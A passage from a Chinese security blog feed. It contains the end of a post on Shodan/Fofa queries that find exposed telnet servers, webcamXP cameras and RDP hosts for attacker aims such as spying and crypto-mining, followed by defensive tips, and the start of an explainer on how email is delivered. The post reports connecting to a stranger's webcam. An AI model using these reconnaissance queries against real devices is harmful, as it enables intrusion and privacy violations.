&lt;h4 id=&quot;%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-2&quot;&gt;#&lt;/a&gt; 搜尋條件 :&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Port : 23&lt;/li&gt;
&lt;li&gt;回應內容包含 : p750&lt;/li&gt;
&lt;li&gt;回應內容包含 : root@&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C-2&quot;&gt;#&lt;/a&gt; Shodan : 11 筆結果&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__SO9q00Z9x5c1FI__IgBS7ng.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;fofa-%3A-89-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#fofa-%3A-89-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;#&lt;/a&gt; Fofa : 89 筆結果&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__NGGLiD__gKlvmcKbLktDl4w.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-fofa-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-telnet-server&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-fofa-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-telnet-server&quot;&gt;#&lt;/a&gt; 驗證 : 連接到 Fofa 搜索結果中的 Telnet Server&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__myf23vGvuE0YRKFXRs3EFA.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E6%A1%88%E4%BE%8B-3-%3A-%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%A1%88%E4%BE%8B-3-%3A-%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F&quot;&gt;#&lt;/a&gt; 案例 3 : 網路攝影機&lt;/h3&gt;
&lt;h4 id=&quot;%E9%A7%AD%E5%AE%A2-%3A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A7%AD%E5%AE%A2-%3A-3&quot;&gt;#&lt;/a&gt; 駭客 :&lt;/h4&gt;
&lt;p&gt;我無聊想看看別人在幹嘛。&lt;/p&gt;
&lt;h4 id=&quot;%E8%AA%AA%E6%98%8E-%3A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%AA%AA%E6%98%8E-%3A-3&quot;&gt;#&lt;/a&gt; 說明 :&lt;/h4&gt;
&lt;p&gt;webcamXP 是整合了 HTTP 網頁伺服器功能的 WebCam 網路攝影機伺服器軟體，藉由它，您可以將網路攝影機所拍攝的內容即時分享給網路上的任何人，包含駭客，另外這類型的搜尋加上地區條件時會有奇效。&lt;/p&gt;
&lt;h4 id=&quot;%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-3&quot;&gt;#&lt;/a&gt; 搜尋條件 :&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Server : webcamXP 5&lt;/li&gt;
&lt;li&gt;回應內容不包含 : 360 (排除 honeypot(註1) 中的回應內容)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;shodan-%3A-239-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#shodan-%3A-239-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;#&lt;/a&gt; Shodan : 239 筆結果&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__lLn3bhqi4v4wl20CHRHw__g.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;fofa-%3A-1718-%E7%AD%86%E7%B5%90%E6%9E%9C-(950%E5%80%8B%E8%A8%AD%E5%82%99)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#fofa-%3A-1718-%E7%AD%86%E7%B5%90%E6%9E%9C-(950%E5%80%8B%E8%A8%AD%E5%82%99)&quot;&gt;#&lt;/a&gt; Fofa : 1718 筆結果 (950個設備)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__HwqfAOCXyAhnA83xUkUSeQ.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;%E9%A9%97%E8%AD%89-%3A-%E5%BE%9E-fofa-%E7%9A%84%E7%B5%90%E6%9E%9C%E4%B8%AD%E6%89%BE%E4%B8%80%E5%80%8B%E5%8F%B0%E7%81%A3%E7%9A%84%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A9%97%E8%AD%89-%3A-%E5%BE%9E-fofa-%E7%9A%84%E7%B5%90%E6%9E%9C%E4%B8%AD%E6%89%BE%E4%B8%80%E5%80%8B%E5%8F%B0%E7%81%A3%E7%9A%84%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F&quot;&gt;#&lt;/a&gt; 驗證 : 從 Fofa 的結果中找一個台灣的網路攝影機&lt;/h4&gt;
&lt;p&gt;(在防疫時期後面的朋友到碧潭玩還不戴口罩，I got you !)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__8ESIlmgyrF5ijsMHOO76kA.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E6%A1%88%E4%BE%8B-4-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%A1%88%E4%BE%8B-4-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)&quot;&gt;#&lt;/a&gt; 案例 4 : 遠端控制 (Windows RDP)&lt;/h3&gt;
&lt;h4 id=&quot;%E9%A7%AD%E5%AE%A2-%3A-4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A7%AD%E5%AE%A2-%3A-4&quot;&gt;#&lt;/a&gt; 駭客 :&lt;/h4&gt;
&lt;p&gt;我想找人幫我挖礦，而且電腦有顯卡才挖的快。&lt;/p&gt;
&lt;h4 id=&quot;%E8%AA%AA%E6%98%8E-%3A-4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%AA%AA%E6%98%8E-%3A-4&quot;&gt;#&lt;/a&gt; 說明 :&lt;/h4&gt;
&lt;p&gt;這項測試用到了 Shodan 獨有的功能 Screenshot，故案例中只包含 Shodan 的結果。RDP(Remote Desktop Protocol) 是 Windows 內建的遠端控制功能，特點之一是會把登入過的使用者帳號顯示出來，這大幅降低了駭客暴力破解難度，配合這個特點增加規則也更好找出容易破解的目標，下圖為典型案例，而且有畫面的話有顯示卡的機會也比較高。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__sfSazc0IKRr__N7za6sQy5g.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-4&quot;&gt;#&lt;/a&gt; 搜尋條件 :&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Port: 3389&lt;/li&gt;
&lt;li&gt;has_screenshot : true&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;shodan-%3A-1039052-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#shodan-%3A-1039052-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;#&lt;/a&gt; Shodan : 1039052 筆結果&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__NfjZ8g1tEIzc__CCnxBYytg.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E6%A1%88%E4%BE%8B-5%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%A1%88%E4%BE%8B-5%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)&quot;&gt;#&lt;/a&gt; 案例 5: 遠端控制 (Windows RDP)&lt;/h3&gt;
&lt;h4 id=&quot;%E9%A7%AD%E5%AE%A2-%3A-5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A7%AD%E5%AE%A2-%3A-5&quot;&gt;#&lt;/a&gt; 駭客 :&lt;/h4&gt;
&lt;p&gt;我想找人幫我挖礦，而且我只要最新的電腦。&lt;/p&gt;
&lt;h4 id=&quot;%E8%AA%AA%E6%98%8E-%3A-5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%AA%AA%E6%98%8E-%3A-5&quot;&gt;#&lt;/a&gt; 說明 :&lt;/h4&gt;
&lt;p&gt;這項測試用到 Fofa 獨有的功能 After 跟邏輯判斷式，故案例中只包含 Fofa 的結果。這結果除了拿來攻擊之外也可以用於分析，從結果可以知道今年多了多少台開啟遠端功能的 Windows。&lt;/p&gt;
&lt;h4 id=&quot;%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-5&quot;&gt;#&lt;/a&gt; 搜尋條件 :&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Port : 3389&lt;/li&gt;
&lt;li&gt;After : 2021–01–01&lt;/li&gt;
&lt;li&gt;回應內容包含 : Windows 10 或 Windows Server 2012&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;fofa-%3A-4438635-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#fofa-%3A-4438635-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;#&lt;/a&gt; Fofa : 4438635 筆結果&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__hIcAaYG7rpWfkLzwdI9Xfg.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;雖然案例中只介紹到一小部份的搜尋規則，但可以從這些案例知道搜尋引擎的影響力，這邊整理幾個防範方法與要注意的地方。&lt;/p&gt;
&lt;h4 id=&quot;%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E5%BE%9E-shodan-%E6%88%96-fofa-%E8%A2%AB%E6%89%BE%E5%88%B0-%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E5%BE%9E-shodan-%E6%88%96-fofa-%E8%A2%AB%E6%89%BE%E5%88%B0-%3F&quot;&gt;#&lt;/a&gt; 如何避免從 Shodan 或 Fofa 被找到 ?&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;家用網路請避免使用固定 IP，固定IP等於是有個固定門牌，駭客想要攻擊也比較容易找到你，尤其是用搜尋引擎。&lt;/li&gt;
&lt;li&gt;有遠端服務需求的朋友避免使用帳密登入，盡量選擇憑證或公私鑰。&lt;/li&gt;
&lt;li&gt;網站建議架在雲端主機，像是 AWS 或 GCP 等，躲在大公司的保護傘下。&lt;/li&gt;
&lt;li&gt;Shodan 和 Fofa 的更新都不是即時的，所以不管是新服務上線或是防護措施更新一週後都要再次到搜尋引擎上確認是否會被找到。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;shodan-%E6%88%96-fofa-%E4%BD%BF%E7%94%A8%E4%B8%8A%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9-%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#shodan-%E6%88%96-fofa-%E4%BD%BF%E7%94%A8%E4%B8%8A%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9-%3F&quot;&gt;#&lt;/a&gt; Shodan 或 Fofa 使用上要注意的地方 ?&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;不管在 Shodan 或 Fofa 免費用戶每天的搜尋量上限都不高，測試過程中很容易超標導致無法繼續使用，所以平常使用時多加一些過濾條件，不只能提升準確度還可以避免太快到達上限，萬一還是超出額度話就只好建立一個新帳號才能繼續使用。&lt;/li&gt;
&lt;li&gt;Shodan 的搜尋方式網路上有很多範例可以參考，官方也有整理一些最常被使用的搜尋方式在 Explore 頁面(&lt;a href=&quot;https://www.shodan.io/explore&quot;&gt;https://www.shodan.io/explore&lt;/a&gt;)，不知道從何下手時不妨先看看別人怎麼找。&lt;/li&gt;
&lt;li&gt;Fofa 有跟 Google 類似的搜尋預測功能，可輸入較短的關鍵字後看看有沒有推薦的查詢方式，目標還不精確時非常實用。&lt;/li&gt;
&lt;li&gt;Fofa 的搜索結果中包含網站所以有些不同的結果是來自同一個 IP，建議計算數量時以獨立 IP 為準(Shodan 也是以 IP 數量來計算結果數)，通常 Fofa 找到的 IP 數量比 Shodan 多，Shodan 找不到問題時可以試試 Fofa。&lt;/li&gt;
&lt;li&gt;在搜尋結果常常會出現一個不太明顯的提醒，告訴你這個目標可能是honeypots，這時候注意不要連過去，很可能受到反擊或資訊竊取，最好從回應內容中找出與一般設備的差別，新增規則來過濾掉這些無用資訊。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1____8dp4s__lb__bhrc__TYXey6A.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果對這類型技術有興趣的話記得幫忙拍手與分享，數量夠多，之後會再加開一篇分享更進階的用法與付費用戶才有的強大功能，有任何資安方面相關的問題都歡迎留言討論，或者直接到 Cymetrics 尋求協助。&lt;/p&gt;
&lt;h3 id=&quot;%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B&quot;&gt;#&lt;/a&gt; 名詞解釋&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;註 1 : 蜜罐 (honeypots)通常偽裝成看似有利用價值的&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF&quot; title=&quot;網路&quot;&gt;網路&lt;/a&gt;、資料、&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6&quot; title=&quot;電腦&quot;&gt;電腦&lt;/a&gt;系統，並故意設定了 弱點，用來吸引&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E9%A7%AD%E5%AE%A2&quot; title=&quot;駭客&quot;&gt;駭客&lt;/a&gt;攻擊。由於蜜罐事實上並未對網路提供任何有價值的服務，所以任何對蜜罐的嘗試都是可疑的。蜜罐中還可能裝有監控軟體，用以監視駭客入侵後的舉動。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;#&lt;/a&gt; 參考資料&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.shodan.io/&quot;&gt;https://www.shodan.io/&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://fofa.so/&quot;&gt;https://fofa.so/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>關於 email security 的大小事 — 原理篇</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/"/>
		<updated>2021-07-02T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;!-- 大家可能常常在新聞上看到某某公司遭到釣魚信件攻擊，駭客『偽冒公司員工寄信』造成受害者上當的故事。不管是交出內部服務的帳號密碼，還是下載惡意軟體中毒，都是很嚴重的後果，讓我們來看看 email security 是什麼，又有哪些攻防機制吧！ --&gt;
&lt;!-- summary --&gt;
&lt;p&gt;大家可能常常在新聞上看到某某公司遭到釣魚信件攻擊，駭客『偽冒公司員工寄信』造成受害者上當的故事。不管是交出內部服務的帳號密碼，還是下載惡意軟體中毒，都是很嚴重的後果，所以常說資安最薄弱的一環就是人的意識啊（嘆。&lt;/p&gt;
&lt;p&gt;但是釣魚信件那麼猖狂，難道就只能依靠受害者自己的意識嗎？撇除用相似的域名寄信，像是 &lt;a href=&quot;http://g1thu6.com/&quot;&gt;g1thu6.com&lt;/a&gt; 或 &lt;a href=&quot;http://app1e.com/&quot;&gt;app1e.com&lt;/a&gt; 的這種仔細觀察就能發現端倪的情況，如果寄信人的地址真的寫著 &lt;a href=&quot;http://github.com/&quot;&gt;github.com&lt;/a&gt; 跟 &lt;a href=&quot;http://apple.com/&quot;&gt;apple.com&lt;/a&gt;，我要怎麼判斷是不是釣魚啊？再謹慎的人都沒輒吧？&lt;/p&gt;
&lt;p&gt;為了讓寄件方負起一點責任，也讓收信方有驗證郵件的依據，於是出現了三種常見的驗證機制：SPF、DKIM、DMARC。但在講這三種設定前，我們首先要理解一封郵件從發信人寄出到收信人點閱中間經歷了哪些事。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;an-email%E2%80%99s-journey&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#an-email%E2%80%99s-journey&quot;&gt;#&lt;/a&gt; An Email’s Journey&lt;/h2&gt;
&lt;p&gt;想像一下，假設你要寄一封手寫的卡片給遠方的親友，你會怎麼做呢？&lt;/p&gt;
&lt;p&gt;你可能會拿一張稿紙，在開頭先寫上『親愛的X：』，接著文情並茂地寫完內文，在結尾附註『愛你的 O』，說不定還會再加上當天的日期。然後，你可能會找一個乾淨的信封，在前面寫上親友的名字以及住址，在背面寫上自己的地址或是郵局信箱位置。最後，把信紙放進信封袋密封好、貼上郵票並投入信箱，等他經過郵差先生傳遞、最後落到對方的信箱裡靜靜躺著。&lt;/p&gt;
&lt;p&gt;其實一封電子郵件的旅程也差不多如此。假設今天我要寄一封電子新年賀卡給爺爺會發生什麼事呢？我們用下面這張圖來說明。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/journey.png&quot; alt=&quot;mail&#39;s journey&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Email’s journey （參考 &lt;a href=&quot;https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc&quot;&gt;Mail Terminology&lt;/a&gt;）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先，我會在網頁上登入我的 gmail ，此時『網頁版 gmail 』這個應用程式就扮演著圖左上角寫著 Mail User Agent（MUA）的角色，是使用者直接互動、操作的介面。當我寫好信之好按下寄出，MUA 就會把我寫的內文（body）前面加上一些 header，包含寄信人（&lt;code&gt;header.From&lt;/code&gt;）、收件人（&lt;code&gt;header.To&lt;/code&gt;）、&lt;code&gt;header.Reply-To&lt;/code&gt;、&lt;code&gt;header.BCC&lt;/code&gt;、&lt;code&gt;header.CC&lt;/code&gt;、日期等等資訊。&lt;/p&gt;
&lt;p&gt;如果你點開信件的原始資訊，會看到類似下面這一張圖的內容：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/header.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Header 的一小部分&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;當 MUA 把信包裝好後，就會通過 SMTP（Simple Mail Transfer Protocol）這個協定進行身份驗證並把信包在一個信封袋（SMTP envelope）中交給 email server。這裡我用的是 gmail，以上圖來說黃色的 sender server 就是一台 gmail server。在 email server 中，首先會送到在 port 587 的 Mail Submission Agent（MSA），在這裡進行一些郵件審查與勘誤。審查的功能常用於確保符合 AD 設定的 policy，例如拒絕非同網域的收信地址、或是未經帳密驗證的寄件人等等。勘誤的部分則是會檢查是否缺少某些 header 欄位或是有格式不正確的地方。&lt;/p&gt;
&lt;p&gt;確定信件準備好送出，就會送到跑在 port 25 上的 Mail Transfer Agent（MTA）這裡。MTA 就是郵差的角色，負責的工作是透過 DNS 查詢收信人網域的 MX 紀錄找到對應的 IP，然後傳送出去。需要注意的是，MTA 並不專指在 sender 或 receiver 端 email server 中運行的程式，他在概念上類似 router ，是負責找出下一個 email server 位置並實際傳輸（relay）的軟體。所以雖然上圖中直接把左邊 sender email server 指到右邊 receiver email server，但中間傳輸過程中是可能經過多個 MTA 的。另外，MSA 與 MTA 通常同時運作在同一台主機上，不過某些比較老的 email server 不一定有 MSA 這個角色，有可能是 MUA 直接把信送到 port 25 的 MTA （此時 MTA 兼負 MSA 的職責）。&lt;/p&gt;
&lt;p&gt;前面說過，使用 SMTP 會把信包在一個信封袋（SMTP envelope）中，實際上也就是加上一些 SMTP 欄位的紀錄，例如 &lt;code&gt;smtp.HELO&lt;/code&gt;、&lt;code&gt;smtp.MailFrom&lt;/code&gt;、&lt;code&gt;smtp.RcptTo&lt;/code&gt; 等等。所以經過 MSA 與 MTA 這些 relay 的信件都會被加上一些軌跡（trace），你可以在原始資訊中看見這些紀錄：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/trace.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;SMTP trace information&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;好不容易送到使用 outlook 的爺爺那邊的 Microsoft server，然後呢？&lt;/p&gt;
&lt;p&gt;首先，MTA 收到信後一看，發現自己就是最終目的地，於是把信轉到同台主機上的 Mail Delivery Agent（MDA），又稱為 Local Delivery Agent（LDA）。MDA 的角色就像收到一大堆信件的社區管理中心，負責把信件分類好並塞到每個住戶的信箱裡，這裡說的信箱是在 email server 上的信件儲存空間 Message Store（MS）。同時，MDA 也會加上一筆 SMTP trace，並把信封袋上的 &lt;code&gt;smtp.MailFrom&lt;/code&gt; 欄位放到 header 中的 &lt;code&gt;Return-Path&lt;/code&gt; 欄位。&lt;/p&gt;
&lt;p&gt;最後，當爺爺打開他的桌機版 outlook （MUA）準備收信時，MUA 就會使用 POP3 或是 IMAP 協定向 email server 上運行的 POP3 / IMAP server 進行身份驗證並要求存取信件，如果驗證成功就會從 MS 中下載我給爺爺的信，這樣爺爺就能在 outlook 的介面上看到我的賀卡啦～&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/journey.png&quot; alt=&quot;mail&#39;s journey&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Email’s journey （參考 &lt;a href=&quot;https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc&quot;&gt;Mail Terminology&lt;/a&gt;）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;至此我們配著圖稍微整理一下這趟旅程中的各個角色：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mail &lt;strong&gt;User&lt;/strong&gt; Agent（MUA）：俗稱的 email client，也就是使用者介面，能讓我們編輯、瀏覽、標記、分類信件等。軟體有：Gmail、Hotmail、Outlook、Thunderbird 等。&lt;/li&gt;
&lt;li&gt;Mail &lt;strong&gt;Submission&lt;/strong&gt; Agent（MSA）：寄出前將 MUA 送來的信進行審查與勘誤。不一定有專責軟體，有些 MTA 兼有 MSA 的功能。&lt;/li&gt;
&lt;li&gt;Mail &lt;strong&gt;Transfer&lt;/strong&gt; Agent（MTA）：負責信件的『路由』，有時又稱為 mail relay、mail exchanger、MX host 等。軟體有：Postfix、Exim、Sendmail、qmail、Postal、Cuttlefish 等。&lt;/li&gt;
&lt;li&gt;Mail &lt;strong&gt;Delivery&lt;/strong&gt; Agent（MDA）：將 MTA 傳來的信件放到 email server上的信箱儲存空間。軟體有：Cyrus IMAP、dovecot、fetchmail、sieve、courier-maildrop、getmail 等。&lt;/li&gt;
&lt;li&gt;Message Store（MS）：儲存信件的地方，可能為遠端（remote）或本地端（local），也可能有多個共同運作。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&quot;%E9%80%99%E9%BA%BC%E5%A4%9A%E6%AC%84%E4%BD%8D%E5%B7%AE%E5%9C%A8%E5%93%AA%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%80%99%E9%BA%BC%E5%A4%9A%E6%AC%84%E4%BD%8D%E5%B7%AE%E5%9C%A8%E5%93%AA%EF%BC%9F&quot;&gt;#&lt;/a&gt; 這麼多欄位差在哪？&lt;/h2&gt;
&lt;p&gt;講到這裡，很多人會困惑到底前面說的信紙（&lt;code&gt;header.From, header.To&lt;/code&gt;）與信封袋（&lt;code&gt;smtp.MailFrom, smtp.RcptTo&lt;/code&gt;）上的欄位有何不同？不就都是寫著一樣的信箱位置嗎？&lt;/p&gt;
&lt;p&gt;其實，信紙跟信封袋上的寄信人欄位是可以不同的！&lt;/p&gt;
&lt;p&gt;在 SMTP 協議下，&lt;code&gt;smtp.MailFrom&lt;/code&gt; 這個欄位其實有一個重要功能，就是指示 MTA 如果這封信寄送失敗的話，要退件到哪個地址去，所以又稱為 bounce address。一般來說如果是個人寄信的話，失敗當然就是直接回給寄件人，此時 &lt;code&gt;header.From = smtp.MailFrom&lt;/code&gt;，不過如果是公司或是網站的 mailing list 這種自動化寄信給訂閱者的應用場景，有時會希望把傳送失敗的信統一集中到另一個信箱處理。另一種情境是，當信件會經過一個中繼 email server 然後被自動轉發（Forward）時，&lt;code&gt;header.From&lt;/code&gt; 會是原始信件的寄件人，但 &lt;code&gt;smtp.MailFrom&lt;/code&gt; 會是中繼 email server 一個專收報錯的信箱，畢竟你可不希望轉發錯誤被報錯到原始寄件人那兒啊！&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SMTP 欄位只有在以 SMTP 溝通的角色之間才會使用，我們在 MUA 介面上看到的寄信人等資料都是放在 header 中的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你可以想像成，信紙是給收信人（爺爺）看的，但信封袋是給郵政人員（MxA）看的，所以信封袋上的註記當然都不會讓爺爺看到囉！&lt;/p&gt;
&lt;p&gt;關於 email 的各種定義可以在 &lt;a href=&quot;https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users&quot;&gt;Internet Mail Architecture&lt;/a&gt; 詳細閱讀，這裡也附上 RFC 定義的欄位列表：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;originator：指的是作者（author），在上面流程中就是寫信的我&lt;/li&gt;
&lt;li&gt;relay：負責信件路由與傳送的郵差，通常指 MTA&lt;/li&gt;
&lt;li&gt;source：在定義上為『負責確保信件有效（valid）再交給 relay 』的角色，即 MUA 與 MSA&lt;/li&gt;
&lt;li&gt;mediator：指 user-level 的信件傳送，如 mailing list 這種自動轉發的中間人角色，或是 MDA 所支援的 aliasing 功能。與 MTA relay 機制不同。&lt;/li&gt;
&lt;/ul&gt;
